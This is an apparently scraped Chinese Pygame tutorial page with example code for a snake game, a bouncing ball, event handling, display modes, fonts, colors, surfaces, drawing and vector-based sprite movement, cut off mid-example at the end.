def running_game(screen,snake_speed_clock):
    startx = random.randint(3, map_width - 8) #开始位置
    starty = random.randint(3, map_height - 8)
    snake_coords = [{'x': startx, 'y': starty},{'x': startx - 1, 'y': starty},{'x': startx - 2, 'y': starty}]  #初始贪吃蛇
    direction = RIGHT       #  开始时向右移动

    food = get_random_location()     #实物随机位置

    while True:
        for event in pygame.event.get():
            if event.type == QUIT: terminate()
            elif event.type == KEYDOWN:
                if event.key == K_ESCAPE: terminate()
                elif (event.key == K_LEFT or event.key == K_a) and direction != RIGHT:
                    direction = LEFT
                elif (event.key == K_RIGHT or event.key == K_d) and direction != LEFT:
                    direction = RIGHT
                elif (event.key == K_UP or event.key == K_w) and direction != DOWN:
                    direction = UP
                elif (event.key == K_DOWN or event.key == K_s) and direction != UP:
                    direction = DOWN

        move_snake(direction, snake_coords) #移动蛇

        if not snake_is_alive(snake_coords): break #蛇跪了. 游戏结束
        snake_is_eat_food(snake_coords, food) #判断蛇是否吃到食物

        screen.fill(BG_COLOR)
        draw_grid(screen)
        draw_snake(screen, snake_coords)
        draw_food(screen, food)
        draw_score(screen, len(snake_coords) - 3)
        pygame.display.update()
        snake_speed_clock.tick(snake_speed) #控制fps
#将食物画出来
def draw_food(screen, food):
    x = food['x'] * cell_size
    y = food['y'] * cell_size
    pygame.draw.rect(screen, Red, pygame.Rect(x, y, cell_size, cell_size))
#将贪吃蛇画出来
def draw_snake(screen, snake_coords):
    for coord in snake_coords:
        x = coord['x'] * cell_size
        y = coord['y'] * cell_size
        pygame.draw.rect(screen, dark_blue, pygame.Rect(x, y, cell_size, cell_size))
        pygame.draw.rect(screen, blue, pygame.Rect(x + 4, y + 4, cell_size - 8, cell_size - 8))  #蛇身子里面的第二层亮绿色
#画网格(可选)
def draw_grid(screen):
    for x in range(0, windows_width, cell_size):  # draw 水平 lines
        pygame.draw.line(screen, dark_gray, (x, 0), (x, windows_height))
    for y in range(0, windows_height, cell_size):  # draw 垂直 lines
        pygame.draw.line(screen, dark_gray, (0, y), (windows_width, y))
#画成绩
def draw_score(screen,score):
    font = pygame.font.SysFont("simsunnsimsun", 40)
    scoreSurf = font.render('得分: %s' % score, True, Green)
    screen.blit(scoreSurf, (windows_width - 180, 10))
#移动贪吃蛇
def move_snake(direction, snake_coords):
    if direction == UP:
        newHead = {'x': snake_coords[0]['x'], 'y': snake_coords[0]['y'] - 1}
    elif direction == DOWN:
        newHead = {'x': snake_coords[0]['x'], 'y': snake_coords[0]['y'] + 1}
    elif direction == LEFT:
        newHead = {'x': snake_coords[0]['x'] - 1, 'y': snake_coords[0]['y']}
    elif direction == RIGHT:
        newHead = {'x': snake_coords[0]['x'] + 1, 'y': snake_coords[0]['y']}

    snake_coords.insert(0, newHead)
#判断蛇死了没
def snake_is_alive(snake_coords):
    tag = True
    if snake_coords[0]['x'] == -1 or snake_coords[0]['x'] == map_width or snake_coords[0]['y'] == -1 or \
            snake_coords[0]['y'] == map_height:
        tag = False # 蛇碰壁啦
    for snake_body in snake_coords[1:]:
        if snake_body['x'] == snake_coords[0]['x'] and snake_body['y'] == snake_coords[0]['y']:
            tag = False # 蛇碰到自己身体啦
    return tag
#判断贪吃蛇是否吃到食物
def snake_is_eat_food(snake_coords, food):  #如果是列表或字典,那么函数内修改参数内容,就会影响到函数体外的对象。
    if snake_coords[0]['x'] == food['x'] and snake_coords[0]['y'] == food['y']:
        food['x'] = random.randint(0, map_width - 1)
        food['y'] = random.randint(0, map_height - 1) # 实物位置重新设置
    else:
        del snake_coords[-1]  # 如果没有吃到实物, 就向前移动, 那么尾部一格删掉
#食物随机生成
def get_random_location():
    return {'x': random.randint(0, map_width - 1), 'y': random.randint(0, map_height - 1)}
#开始信息显示
def show_start_info(screen):
    font = pygame.font.SysFont("simsunnsimsun", 40)
    tip = font.render('按任意键开始游戏~~~', True, (65, 105, 225))
    screen.blit(tip, (240, 350))
    # gamestart = pygame.image.load('gamestart.png')
    # screen.blit(gamestart, (140, 30))
    pygame.display.update()

    while True:  #键盘监听事件
        for event in pygame.event.get():  # event handling loop
            if event.type == QUIT:
                terminate()     #终止程序
            elif event.type == KEYDOWN:
                if (event.key == K_ESCAPE):  #终止程序
                    terminate() #终止程序
                else:
                    return #结束此函数, 开始游戏
#游戏结束信息显示
def show_gameover_info(screen):
    font = pygame.font.SysFont("simsunnsimsun", 40)
    tip = font.render('按Q或者ESC退出游戏, 按任意键重新开始游戏~', True, (65, 105, 225))
    screen.blit(tip, (80, 300))
    # gamestart = pygame.image.load('gameover.png')
    # screen.blit(gamestart, (60, 0))
    pygame.display.update()

    while True:  #键盘监听事件
        for event in pygame.event.get():  # event handling loop
            if event.type == QUIT:
                terminate()     #终止程序
            elif event.type == KEYDOWN:
                if event.key == K_ESCAPE or event.key == K_q:  #终止程序
                    terminate() #终止程序
                else:
                    return #结束此函数, 重新开始游戏

#程序终止
def terminate():
    pygame.quit()
    sys.exit()

main()

</textarea>碰碰球<textarea>
import pygame
import sys

pygame.init()
pygame.display.set_caption('Ball')

size = width, height = 640, 480          # 默认640*480
all_size = pygame.display.list_modes()   # 所有可用大小
full = all_size[0]                       # 屏幕大小
divide = float(full[0]) / float(full[1]) # 屏幕长宽比
for i in all_size:
    if i[0] <= 1680: # 如果宽大于1680会无法正常工作,所以要小于1680
        if float(i[0]) / float(i[1]) == divide: # 如果和屏幕的长宽比相同
            maximum = i      # 就是最大分辨率
            break

background = (255, 255, 255) # 背景是白色
screen = pygame.display.set_mode(size, pygame.RESIZABLE)
screen.fill(background)

direction = [0, 0]           # 球的方向和速度

ball = pygame.image.load('light.gif') # 球的图片
position = [1, 1]                     # 球的初始位置
status = ball.get_rect()              # 用于获取球的大小
screen.blit(ball, position)

pygame.display.flip()

clock = pygame.time.Clock()

long_press = {'up': False, 'down': False, 'left': False, 'right': False} # 记录按键是否长按

fullscreen = False # 初始状态不是全屏

while True:
    for i in pygame.event.get():
        if i.type == pygame.QUIT:    # 退出键按下
            sys.exit()
        if i.type == pygame.KEYDOWN: # F11按下(全屏)
            if i.key == pygame.K_F11:
                fullscreen = not fullscreen
                if fullscreen:
                    screen = pygame.display.set_mode(maximum, pygame.FULLSCREEN | pygame.HWSURFACE) # 开启硬件加速和全屏
                    width, height = maximum
                else:
                    screen = pygame.display.set_mode(size, pygame.RESIZABLE)
                    width, height = size
            if i.key == pygame.K_UP: # 增加长按状态(按下方向键)
                long_press['up'] = True
            if i.key == pygame.K_DOWN:
                long_press['down'] = True
            if i.key == pygame.K_LEFT:
                long_press['left'] = True
            if i.key == pygame.K_RIGHT:
                long_press['right'] = True

        if i.type == pygame.KEYUP: # 取消长按状态(松开按键)
            if i.key == pygame.K_UP:
                long_press['up'] = False
            if i.key == pygame.K_DOWN:
                long_press['down'] = False
            if i.key == pygame.K_LEFT:
                long_press['left'] = False
            if i.key == pygame.K_RIGHT:
                long_press['right'] = False

        if i.type == pygame.VIDEORESIZE: # 改变窗口大小时, 也改变尺寸
            now_size = list(i.size) # 记录改变前的大小
            if i.size[0] >= status.width + 2 and i.size[1] >= status.height + 2:
                size = width, height = i.size
                screen = pygame.display.set_mode(size, pygame.RESIZABLE)
            else: # 如果窗口大小小于球的大小
                if i.size[0] < status.width + 2: # 确保球不碰到边缘,左右各加一像素间距
                    now_size[0] = status.width + 2
                if i.size[1] < status.height + 2:
                    now_size[1] = status.height + 2
                screen = pygame.display.set_mode(now_size, pygame.RESIZABLE)

    clock.tick(200) # 每秒200帧
     # 检测是否碰到边缘
    if position[0] <= 0: # 碰到左边缘
        position[0] = 1
        direction[0] = -direction[0]
    if position[1] <= 0: # 碰到上边缘
        position[1] = 1
        direction[1] = -direction[1]
    if position[0] + status.width >= width: # 碰到右边缘
        position[0] = width - status.width - 1
        direction[0] = -direction[0]
    if position[1] + status.height >= height: # 碰到下边缘
        position[1] = height - status.height - 1
        direction[1] = -direction[1]

    # 长按时,球不断加速
    if long_press['up']:
        direction[1] -= 0.015
    if long_press['down']:
        direction[1] += 0.015
    if long_press['left']:
        direction[0] -= 0.015
    if long_press['right']:
        direction[0] += 0.015

    position[0] += direction[0] # 改变球的位置
    position[1] += direction[1] # 同上
    screen.fill(background)
    screen.blit(ball, (int(position[0]), int(position[1]))) # 更新球的位置
    pygame.display.flip()
    direction[0] *= 0.996 # 让球不断减速
    direction[1] *= 0.996 # 同上

</textarea><pre>
【 事件过滤 】
并不是所有的事件都需要处理,使用pygame.event.set_blocked(type)来完成。如果有好多事件需要过滤可以传递一个列表,比如pygame.event.set_blocked([KEYDOWN, KEYUP]),如果设置参数None则所有的事件有被打开了。
与之相对的,使用pygame.event.set_allowed()来设定允许的事件。

【 产生事件 】
通常玩家做什么,Pygame就产生对应的事件就可以了,不过有时需要模拟出一些事件来,比如录像回放时就要把用户的操作再现一遍。
为了产生事件,必须先造一个出来,然后再传递它
Event():Event(type, dict)
Event(type, **attributes),

my_event = pygame.event.Event(KEYDOWN, key=K_SPACE, mod=0, unicode=' ')
my_event = pygame.event.Event(KEYDOWN, {"key":K_SPACE, "mod":0, "unicode":' '})
pygame.event.post(my_event) # 把新的事件放在事件队列的最后

</pre>也可以产生一个完全自定义的全新事件<textarea>
import pygame
from pygame.locals import *

pygame.init()

my_event = pygame.event.Event(KEYDOWN,{"key":K_SPACE, "mod":0, "unicode":' '})
pygame.event.post(my_event)

###############
# 产生一个自定义的全新事件
CATONKEYBOARD = USEREVENT + 1
my_event = pygame.event.Event(CATONKEYBOARD, message="bad act!")
pygame.event.post(my_event)
# 获得这个事件
for event in pygame.event.get():
    if event.type == CATONKEYBOARD:
        print( event.message)

</textarea>
</div>

<div id="pygame_display">
<h4>显示</h4><pre>
全屏显示
screen = pygame.display.set_mode((640, 480), FULLSCREEN, 32)

在全屏模式下显卡可能就切换了一种模式,可以用如下代码获得机器支持的显示模式
import pygame
pygame.init()
print(pygame.display.list_modes())
[(1366, 768), (1360, 768), (1280, 768), (1280, 720), (1280, 600), (1024, 768), (800, 600), (640, 480), (640, 400), (512, 384), (400, 300), (320, 240), (320, 200)]

</pre>按f键实现全屏和窗口之间的切换<textarea>
import pygame
from pygame.locals import *
from sys import exit

background_image = '../image/sushiplate.jpg'

pygame.init()
screen = pygame.display.set_mode((640, 480), 0, 32)
background = pygame.image.load(background_image).convert()

Fullscreen = False

while True:
    for event in pygame.event.get():
        if event.type == QUIT:
            exit()
        if event.type == KEYDOWN:
            if event.key == K_f:
                Fullscreen = not Fullscreen
                if Fullscreen:
                    screen = pygame.display.set_mode((640, 480), FULLSCREEN, 32)
                else:
                    screen = pygame.display.set_mode((640, 480), 0, 32)

    screen.blit(background, (0, 0))
    pygame.display.update()

</textarea><pre>
改变窗口尺寸
pygame的默认显示窗口是不支持拖动边框改变大小的,改变set_mode函数的参数后可以实现。
screen = pygame.display.set_mode(SCREEN_SIZE, RESIZABLE, 32)

</pre><textarea>
import pygame
from pygame.locals import *
from sys import exit

background_image = 'plt.png'
SCREEN_SIZE = (640, 480)
pygame.init()
screen = pygame.display.set_mode(SCREEN_SIZE, RESIZABLE, 32)
background = pygame.image.load(background_image).convert()

while True:
    event = pygame.event.wait()
    if event.type == QUIT:
        exit()
    if event.type == VIDEORESIZE:
        SCREEN_SIZE = event.size
        screen = pygame.display.set_mode(SCREEN_SIZE, RESIZABLE, 32)
        pygame.display.set_caption("Window resized to " + str(event.size))

    # 这里需要重新填满窗口
    screen_width, screen_height = SCREEN_SIZE
    for y in range(0, screen_height, background.get_height()):
        for x in range(0, screen_width, background.get_width()):
            screen.blit(background, (x, y))

    pygame.display.update()

</textarea><pre>
VIDEORESIZE事件包含如下内容：
size — 一个二维元组,值为更改后的窗口尺寸,size[0]为宽,size[1]为高
w — 宽
h — 高

复合模式
screen = pygame.display.set_mode(SCREEN_SIZE, HWSURFACE | FULLSCREEN, 32)

其他
当使用OPENGL时不能使用pygame.display.update()来更新窗口,而是pygame.display.flip()。

</pre>
</div>

<div id="pygame_font">
<h4>字体</h4><pre>
【 创建font对象 】
Pygame可以直接调用系统字体或使用TTF字体,pygame.font.get_fonts()可获得当前系统所有可用字体

1、SysFont(name, size, bold=False, italic=False)
my_font = pygame.font.SysFont("arial", 16)
第一个参数是字体名,第二个是大小。该函数返回一个系统字体,这个字体与"bold"和"italic"两个flag相匹配。如果找不到就会使用pygame的默认字体

2、Font(filename, size)或Font(object, size)
my_font = pygame.font.Font("simsun.ttf", 16)
使用这个方法需要把字体文件随同游戏一起发送,这样可以避免使用者机器上没有所需的字体

【 使用字体 】
render(text, antialias, color, background=None) -> Surface
text_surface = my_font.render("Pygame is cool!", True, (0,0,0), (255, 255, 255))
第一个参数文字;第二个参数布尔值表示是否开启抗锯齿,如果为True字体会比较平滑,不过相应的速度有一点点影响;第三个参数是字体的颜色;第四个是背景色,如果想没有背景色即透明就不加这第四个参数。

</pre>用pygame书写中文并使文字移动<textarea>
import pygame
from pygame.locals import *
from sys import exit

pygame.init()
screen = pygame.display.set_mode((640, 480), 0, 32)
background_image = 'image/sushiplate.jpg'
background = pygame.image.load(background_image).convert()

# 以下两种方法都可以,第二种需要把字体文件复制到代码文件目录下
font = pygame.font.SysFont("simsunnsimsun", 40)
# font = pygame.font.Font("simsun.ttc", 40)
text_surface = font.render("你好", True, (0, 0, 255))
x = 0
y = (480 - text_surface.get_height())/2

while True:
    for event in pygame.event.get():
        if event.type == QUIT: exit()
    screen.blit(background, (0, 0))

    x -= 1
    if x < -text_surface.get_width(): x = 640 - text_surface.get_width()

    screen.blit(text_surface, (x, y))
    pygame.display.update()

</textarea>
</div>

<div id="pygame_color">
<h4>颜色</h4><pre>
一般的32位RGB,每个像素可以显示16.7百万种颜色

</pre>可以生成所有的颜色<textarea>
import pygame

pygame.init()
screen = pygame.display.set_mode((640, 480))
all_colors = pygame.Surface((4096, 4096), depth=24)

for r in range(256):
    print(r + 1, "out of 256")
    x = (r & 15) * 256
    y = (r >> 4) * 256
    for g in range(256):
        for b in range(256):
            all_colors.set_at((x + g, y + b), (r, g, b))

pygame.image.save(all_colors, "allcolors.bmp") # 生成图片

</textarea>用鼠标移动三个点,代表三原色的值,下方是三原色混合得到的结果<textarea>
import pygame
from pygame.locals import *
from sys import exit

pygame.init()
screen = pygame.display.set_mode((640, 480), 0, 32)

def create_scales(height):
    red_scale_surface = pygame.surface.Surface((640, height))
    green_scale_surface = pygame.surface.Surface((640, height))
    blue_scale_surface = pygame.surface.Surface((640, height))
    for x in range(640):
        c = int((x / 640) * 255)
        red = (c, 0, 0)
        green = (0, c, 0)
        blue = (0, 0, c)
        line_rect = Rect(x, 0, 1, height)
        pygame.draw.rect(red_scale_surface, red, line_rect)
        pygame.draw.rect(green_scale_surface, green, line_rect)
        pygame.draw.rect(blue_scale_surface, blue, line_rect)
    return red_scale_surface, green_scale_surface, blue_scale_surface

red_scale, green_scale, blue_scale = create_scales(80)
color = [127, 127, 127]

while True:
    for event in pygame.event.get():
        if event.type == QUIT: exit()

    screen.fill((0, 0, 0))
    screen.blit(red_scale, (0, 0))
    screen.blit(green_scale, (0, 80))
    screen.blit(blue_scale, (0, 160))

    x, y = pygame.mouse.get_pos()

    if pygame.mouse.get_pressed()[0]:
        for component in range(3):
            if y > component * 80 and y < (component + 1) * 80:
                color[component] = int((x / 639) * 255)
        pygame.display.set_caption("PyGame Color Test - " + str(tuple(color)))

    for component in range(3):
        pos = (int((color[component] / 255) * 639), component * 80 + 40)
        pygame.draw.circle(screen, (255, 255, 255), pos, 20)

    pygame.draw.rect(screen, tuple(color), (0, 240, 640, 240))
    pygame.display.update()

</textarea>
</div>

<div id="pygame_img">
<h4>图像</h4><pre>
使用Surface对象
加载图片用pygame.image.load,返回一个Surface对象。事实上屏幕也只是一个surface对象,pygame.display.set_mode返回一个屏幕的surface对象。

创建Surface对象
除了pygame.image.load外,还可以指定尺寸创建一个空的surface。
a = pygame.Surface((256,256))
这个Surface对象是全黑的。除了大小外,Surface函数还有flags和depth两个参数。
HWSURFACE – creates the image in video memory
SRCALPHA – the pixel format will include a per-pixel alpha。创建有Alpha通道的surface,选择这个选项需要depth为32。
alpha_surface = pygame.Surface((256,256), flags=SRCALPHA, depth=32)

转换Surfaces
convert(): Creates a new copy of the Surface with the pixel format changed. 当一个surface多次使用blit时,最好使用convert。转换后的surface没有alpha。
convert_alpha(): change the pixel format of an image including per pixel alphas

矩形对象(Rectangle Objects)
pygame中有Rect类,用来存储和处理矩形对象(包含在pygame.locals)中。
Rect(left, top, width, height)
Rect((left, top), (width, height))
有了Rect对象之后,可以对其做很多操作,例如调整大小、位置,判断一个点是否在其中等。

剪裁(Clipping)
surface中有裁剪区域(clip area),是一个矩形,定义了哪部分会被绘制,即若定义了这个区域,只有这个区域内的像素会被修改。
set_clip(screen_rect=None): 设定区域,当参数为None时,重置。一个surface对象默认的剪裁区域为这个surface。
get_clip() : 得到剪裁区域,返回一个Rect对象。

子表面(Subsurfaces)
Subsurfaces是在一个surface中再提取出一个surface。当在subsurface上操作时同时也向父表面上操作。这可以用来绘制图形文字,比如吧文字变成多种颜色,把整张图读入后用subsurface将每个字分隔开。

my_font_image = Pygame.load("font.png")
letters = []
letters["a"] = my_font_image.subsurface((0,0), (80,80))
letters["b"] = my_font_image.subsurface((80,0), (80,80))

填充Surface
fill(color, rect=None, special_flags=0)
当rect参数为默认参数时,整个surface都会被填充。color参数可以为RGB或RGBA。如果使用RGBA,除非surface有alpha通道(使用了SRCALPHA flag),否则RGBA的Alpha会被忽略。

设置Surface的像素
set_at((x, y), Color) : 设置单个像素的颜色
get_at((x, y)) : 得到单个像素的颜色

锁定Surface
当对像素进行读或写操作时,surface会被锁定。一个锁定的surface,经常不能被显示或被pygame操作,所以除非必要,在手动lock之后不要忘了unlock。
所有pygame的函数如需要锁定和解锁,这些操作时自动发生的。如果有些时候为了提高效率不想发生自动的lock和unlock,可以在一些会造成自动锁定和解锁的语句前后注释掉这两句。

</pre><textarea>
import pygame
from pygame.locals import *
from sys import exit
from random import randint

pygame.init()
screen = pygame.display.set_mode((640, 480), 0, 32)

while True:
    for event in pygame.event.get():
        if event.type == QUIT:
            exit()

    rand_col = (randint(0, 255), randint(0, 255), randint(0, 255))

    # screen.lock)()
    for _ in range(100):
        rand_pos = (randint(0, 639), randint(0, 479))
        screen.set_at(rand_pos, rand_col)
    # screen.unlock()
    pygame.display.update()

</textarea><pre>
blit
blit(source, dest, area=None, special_flags = 0)
将源图像画到目标位置,dest可以为一个点,也可以是一个矩形,但只有矩形的左上角会被使用,矩形的大小不会造成影响。
area参数可以指定源图像中的一部分被画到目标位置。

</pre>
</div>

<div id="pygame_shape">
<h4>绘制各种图形</h4><pre>
pygame使用pygame.draw来绘制图形,其包含以下几种函数。
rect  绘制矩形  rect(Surface, color, Rect, width=0)
polygon 绘制多边形 polygon(Surface, color, pointlist, width=0)
circle  绘制圆 circle(Surface, color, pos, radius, width=0)
ellipse 绘制椭圆  ellipse(Surface, color, Rect, width=0)
arc 绘制圆弧  arc(Surface, color, Rect, start_angle, stop_angle, width=1)
line  绘制线 line(Surface, color, start_pos, end_pos, width=1)
lines 绘制一系列的线 lines(Surface, color, closed, pointlist, width=1)
aaline  绘制一根平滑的线  aaline(Surface, color, startpos, endpos, blend=1)
aalines 绘制一系列平滑的线 aalines(Surface, color, closed, pointlist, blend=1)

width参数：width参数为0或省略则填充。
画填充的矩形,有另一个方法pygame.surface.fill(color),事实上这种方法速度更快。
lines函数的closed为一个布尔变量,如果closed为真则会画一条连接第一个和最后一个点的线,是整个图形闭合。

</pre>
</div>

<div id="pygame_move">
<h4>运动</h4><pre>
动画
动画是在每一帧上,相对前一帧把精灵的坐标在加减一些而已;
使用时间来计算加减的量以在不同性能的计算机上获得一致的动画效果;
使用向量来计算运动的过程来减轻劳动,在3D的情况下简单的使用Vector3便可以了

直线运动
下面这个程序让"hello world"程序中的鱼动起来。

</pre><textarea>
import pygame
from pygame.locals import *
from sys import exit

background_image = '../image/sushiplate.jpg'
sprite_image = '../image/fugu.png'

pygame.init()
screen = pygame.display.set_mode((640, 480), 0, 32)
background = pygame.image.load(background_image).convert()
sprite = pygame.image.load(sprite_image)

# sprite的起始坐标
x = 0

while True:
    for event in pygame.event.get():
        if event.type == QUIT: exit()

    screen.blit(background, (0, 0))
    screen.blit(sprite, (x, 100))
    x += 1
    if x>640: x = 0
    pygame.display.update()

</textarea><pre>
时间
在上面的程序中,帧率是很高的。而且电脑的性能不同,鱼的速度就会不同,如果动画的的元素很多,速度就会下降。
为了解决这个问题,可以使用pygame的时间模块,控制帧速率,控制每个循环多长时间运行一次

clock = pygame.time.Clock()  # 初始化一个Clock对象
time_passed = clock.tick()   # 返回了距上一次调用这个函数过去了多少毫秒
time_passed = clock.tick(60) # 每秒60帧,这个循环应当每秒运行60次,每个循环需要1000/60=16.66ms(大约17ms)如果循环中的代码运行时间超过17ms,在clock指出下一次循环时当前循环将无法完成

给定的值仅仅是最大帧率,当动作复杂或机器性能不足时,实际帧率无法达到这个值,需要一种手段控制动画效果。比如给吾提一个恒定的速度,再通过时间,计算出移动的距离。

</pre><textarea>
import pygame
from pygame.locals import *
from sys import exit

background_image = 'plt.png'
sprite_image = 'light.gif'

pygame.init()
screen = pygame.display.set_mode((640, 480), 0, 32)
background = pygame.image.load(background_image).convert()
sprite = pygame.image.load(sprite_image)

clock = pygame.time.Clock()  # clock对象
x = 0
speed = 250

while True:
    for event in pygame.event.get():
        if event.type == QUIT: exit()

    screen.blit(background, (0, 0))
    screen.blit(sprite, (x, 100))

    time_passed = clock.tick()
    time_passed_seconds = time_passed/1000

    distance_moved = time_passed_seconds * speed
    x += distance_moved
    if x > 640: x -= 640

    pygame.display.update()

</textarea><pre>
斜线运动
接下来这个程序,使得物体斜线运动并且触边反弹

</pre><textarea>
import pygame
from pygame.locals import *
from sys import exit

background_image = 'plt.png'
sprite_image = 'light.gif'

pygame.init()
screen = pygame.display.set_mode((640, 480), 0, 32)
background = pygame.image.load(background_image).convert()
sprite = pygame.image.load(sprite_image)

clock = pygame.time.Clock()
x, y = 100, 100
speed_x, speed_y = 133, 170

while True:
    for event in pygame.event.get():
        if event.type == QUIT: exit()

    screen.blit(background, (0, 0))
    screen.blit(sprite, (x, y))

    time_passed = clock.tick(30)
    time_passed_seconds = time_passed/1000
    x += speed_x * time_passed_seconds
    y += speed_y * time_passed_seconds

    # 到达边界后速度反向
    if x > 640 - sprite.get_width():
        speed_x = -speed_x
        x = 640 - sprite.get_width()
    elif x < 0:
        speed_x = -speed_x
        x = 0

    if y > 480 - sprite.get_height():
        speed_y = -speed_y
        y = 480 - sprite.get_height()
    elif y < 0:
        speed_y = -speed_y
        y = 0

    pygame.display.update()

</textarea><pre>
向量
向量的表示和坐标很像,(10,20)对坐标而言就是一个固定的点,然而在向量中它意味着x方向行进10,y方向行进20,所以坐标(0,0)加上向量(10,20)后,就到达了点(10,20)
向量可以通过两个点来计算出来,A经过向量AB到达了B,则向量AB就是(30, 35) – (10, 20) = (20, 15)。也能猜到向量BA会是(-20, -15),注意向量AB和向量BA,虽然长度一样,但是方向不同

在Python中可以创建一个类来存储和获得向量,虽然向量的写法很像一个元组,但因为向量有很多种计算,必须使用类来完成
向量的运算被广泛的用来计算到达某个位置时的中间状态,比如知道一辆坦克从A到B,中间有10帧,那么很显然的把步进向量通过(B-A)/10计算出来,每次在当前位置加上就可以了

</pre><textarea>
import math

class Vector2(object):
    def __init__(self, x=0.0, y=0.0):
        self.x = x
        self.y = y
    def __str__(self):
        return "(%s, %s)"%(self.x, self.y)

    @classmethod
    def from_points(cls, P1, P2):
        return cls( P2[0] – P1[0], P2[1] – P1[1] )

    # 向量的大小可以简单的理解为那根箭头的长度,勾股定理计算
    def get_magnitude(self):
      return math.sqrt( self.x**2 + self.y**2 )

    # 单位向量:向量有着大小和方向两个要素,单位向量是大小为1的向量,还能把任意向量方向不变的缩放(体现在数字上就是x和y等比例的缩放)到一个单位向量,这叫向量的规格(正规)化
    def normalize(self):
        magnitude = self.get_magnitude()
        self.x /= magnitude
        self.y /= magnitude

    # 向量运算:三角形的三点,点B由A出发,通过向量AB到达,C则由B出发,通过BC到达;C直接由A出发的话就得经由向量AC
    # 向量AC = 向量AB + 向量BC。向量的加法计算方法：(20, 15) + (-15, 10) = (20-15, 15+10) = (5, 25)
    # 把各个方向分别相加就得到了向量的加法运算法则。很类似的,减法也是同样,把各个方向分别相减
    # 两个下划线"__"为首尾的函数,在Python中一般就是重载的意思,super代替Vector2可能会更好一些
    def __add__(self, rhs):
        return Vector2(self.x + rhs.x, self.y + rhs.y)
    def __sub__(self, rhs):
        return Vector2(self.x - rhs.x, self.y - rhs.y)

    # 向量的乘除并不是发生在两个向量直接,而是用一个向量来乘/除一个数,其实际意义就是向量的方向不变,而大小放大/缩小多少倍
    def __mul__(self, scalar):
        return Vector2(self.x * scalar, self.y * scalar)
    def __div__(self, scalar):
        return Vector2(self.x / scalar, self.y / scalar)

# 可以使用下面的方法来计算两个点之间的向量
A = (10.0, 20.0)
B = (30.0, 35.0)
AB = Vector2.from_points(A, B)
print(AB)

</textarea><pre>
更好的向量类
pip install gameobjects

</pre><textarea>
from gameobjects.vector2 import *
A = (10.0, 20.0)
B = (30.0, 35.0)
AB = Vector2.from_points(A, B)
print(AB)
print(AB * 2)
print(AB / 2)
print(AB + (–10, 5))
print(AB.get_magnitude())
print(AB.get_normalized())

# 结果是下面
( 20, 15 )
( 40, 30 )
( 10, 7.5 )
( 10, 20 )
25.0
( 0.8, 0.6 )

</textarea><textarea>
background_image_filename = 'sushiplate.jpg'
sprite_image_filename = 'fugu.png'

import pygame
from pygame.locals import *
from sys import exit
from gameobjects.vector2 import Vector2

pygame.init()
screen = pygame.display.set_mode((640, 480), 0, 32)
background = pygame.image.load(background_image_filename).convert()
sprite = pygame.image.load(sprite_image_filename).convert_alpha()

clock = pygame.time.Clock()
position = Vector2(100.0, 100.0)
heading = Vector2()

while True:
    for event in pygame.event.get():
        if event.type == QUIT: exit()

    screen.blit(background, (0,0))
    screen.blit(sprite, position)

    time_passed = clock.tick()
    time_passed_seconds = time_passed / 1000.0

    # 参数前面加*意味着把列表或元组展开
    destination = Vector2( *pygame.mouse.get_pos() ) - Vector2( *sprite.get_size() )/2
    # 计算鱼儿当前位置到鼠标位置的向量
    vector_to_mouse = Vector2.from_points(position, destination)
    # 向量规格化
    vector_to_mouse.normalize()

    # 这个heading可以看做是鱼的速度,但是由于这样的运算,鱼的速度就不断改变了
    # 在没有到达鼠标时,加速运动,超过以后则减速。因而鱼会在鼠标附近晃动。
    heading = heading + (vector_to_mouse * .6)

    position += heading * time_passed_seconds
    pygame.display.update()

</textarea><pre>
下面这个例子,使用向量代替之前的x和y的计算,实现了鱼在鼠标周围游动的效果。

使用向量类来存储和计算向量。

</pre><textarea>
import pygame
from pygame.locals import *
from sys import exit
from vector import Vec2d

background_image = 'plt.png'
sprite_image = 'light.gif'

pygame.init()
screen = pygame.display.set_mode((640, 480), 0, 32)
background = pygame.image.load(background_image).convert()
sprite = pygame.image.load(sprite_image)

clock = pygame.time.Clock()
position = Vec2d(100, 100)
heading = Vec2d((0, 0))

while True:
    for event in pygame.event.get():
        if event.type == QUIT: exit()

    screen.blit(background, (0, 0))
    screen.blit(sprite, position)

    time_passed = clock.tick(30)
    time_passed_seconds = time_passed/1000

    # 在参数前面加*意味着把列表或元组展开
    destination = Vec2d(*pygame.mouse.get_pos()) - Vec2d(*sprite.get_size())/2
    # 计算当鱼儿当前位置到鼠标位置的向量
    vector_to_mouse = Vec2d.__sub__(destination, position)
    vector_to_mouse.normalized()

    # heading可以看做是鱼的速度,鱼的速度大小、方向不断改变
    heading = heading + (vector_to_mouse * 0.1)
    position += heading * time_passed_seconds

    pygame.display.update()

</textarea>
</div>

<div id="pygame_input">
<h4>用户输入</h4><pre>
键盘输入
在之前的例子中使用过键盘输入,使用pygame.event.get()获取所有事件,当event.type==KEYDOWN时再判断event.key的种类。也可以使用pygame.key.get_pressed()来获取所有按下的键值,它会返回一个元组,这个元祖的索引就是键值,对应的值为True就是按下。
但如果要处理文本输入,这个函数不是正确的方法。因为不知道按键被按下的顺序。

key模块下还有如下的函数：
key.get_focused —— 返回当前的pygame窗口是否激活
key.get_mods —— 按下的组合键(Alt, Ctrl, Shift),if pygame.key.get_mods() & KMOD_SHIFT:
key.set_mods —— 也可以模拟按下组合键的效果(KMOD_ALT, KMOD_CTRL, KMOD_SHIFT)
key.set_repeat —— 参数为(delay,interval)。当有参数时即repeat被激活时被按住的键会产生多次KEYDOWN事件。第一次发送KEYDOWN事件后,经过delay时间(ms)发送第二次,然后每隔interval时间(ms)发送一次事件。如果没有参数,不产生重复按键事件。当pygame初始化之后,重复按键默认为disabled
key.name —— 接受键值返回键名

使用键盘控制方向

</pre>使用ASDW控制方向<textarea>
import pygame
from pygame.locals import *
from sys import exit
from vector import Vec2d

background_image = '../image/sushiplate.jpg'
sprite_image = '../image/fugu.png'

pygame.init()
screen = pygame.display.set_mode((640, 480), 0, 32)
background = pygame.image.load(background_image).convert()
sprite = pygame.image.load(sprite_image)
clock = pygame.time.Clock()
sprite_pos = Vec2d(200, 150)
sprite_speed = 300

while True:
    for event in pygame.event.get():
        if event.type == QUIT: exit()

    pressed_keys = pygame.key.get_pressed()
    key_direction = Vec2d(0, 0)
    if pressed_keys[K_LEFT]:
        key_direction.x = -1
    elif pressed_keys[K_RIGHT]:
        key_direction.x = +1
    if pressed_keys[K_UP]:
        key_direction.y = -1
    elif pressed_keys[K_DOWN]:
        key_direction.y = +1
    key_direction.normalized()

    screen.blit(background, (0, 0))
    screen.blit(sprite, sprite_pos)

    time_passed = clock.tick(30)
    time_passed_seconds = time_passed/1000
